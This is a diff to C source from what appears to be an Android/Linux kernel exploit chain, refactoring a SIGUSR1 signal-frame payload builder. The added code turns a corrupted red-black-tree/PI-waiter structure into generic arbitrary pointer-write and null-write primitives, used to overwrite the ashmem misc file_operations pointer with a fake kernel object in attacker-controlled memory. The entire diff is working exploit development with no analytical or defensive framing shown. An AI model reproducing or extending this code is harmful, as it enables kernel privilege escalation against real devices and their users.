@@ -14,6 +14,7 @@
 #include <sys/ucontext.h>
 #include <unistd.h>
 
+#include "04_fake_kernel_objects.h"
 #include "06_signal_frame_payload.h"
 
 #define SIGUSR1_PAYLOAD_SIZE 0x200
@@ -25,15 +26,15 @@ static void put64(unsigned char *base, size_t off, uint64_t value) {
   memcpy(base + off, &value, sizeof(value));
 }
 
-void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
+static void sigusr1_build_rb_payload(uint64_t page_base, uint64_t parent,
+                                     uint64_t right) {
   memset(g_payload, 0, sizeof(g_payload));
-  uint64_t pi_parent = page_base | 0x1180ULL;
   uint64_t pi_waiters_self_ref = page_base | 0x14e8ULL;
   uint64_t scratch_2380 = page_base | 0x2380ULL;
   uint64_t waiter_lock = page_base | 0x1390ULL;
 
-  put64(g_payload, 0x18, pi_parent);
-  put64(g_payload, 0x20, ashmem_misc_fops_addr);
+  put64(g_payload, 0x18, parent);
+  put64(g_payload, 0x20, right);
   put64(g_payload, 0x28, 0);
   put64(g_payload, 0x30, pi_waiters_self_ref);
   put64(g_payload, 0x38, 0);
@@ -43,6 +44,23 @@ void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
   put64(g_payload, 0x58, 0x8200000000ULL);
   put64(g_payload, 0x60, 0);
   put64(g_payload, 0x68, 0);
+}
+
+void sigusr1_build_pointer_write_payload(uint64_t page_base,
+                                         uint64_t target_addr,
+                                         uint64_t replacement_addr) {
+  sigusr1_build_rb_payload(page_base, replacement_addr, target_addr);
+}
+
+void sigusr1_build_null_write_payload(uint64_t page_base,
+                                      uint64_t target_addr) {
+  sigusr1_build_rb_payload(page_base, target_addr - 8, 0);
+}
+
+void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
+  sigusr1_build_pointer_write_payload(
+      page_base, ashmem_misc_fops_addr,
+      page_base | OSS_PRIMARY_FOPS_LIVE_OFFSET);
 }
 
 static void sigusr1_handler(int sig, siginfo_t *info, void *ucontext_v) {
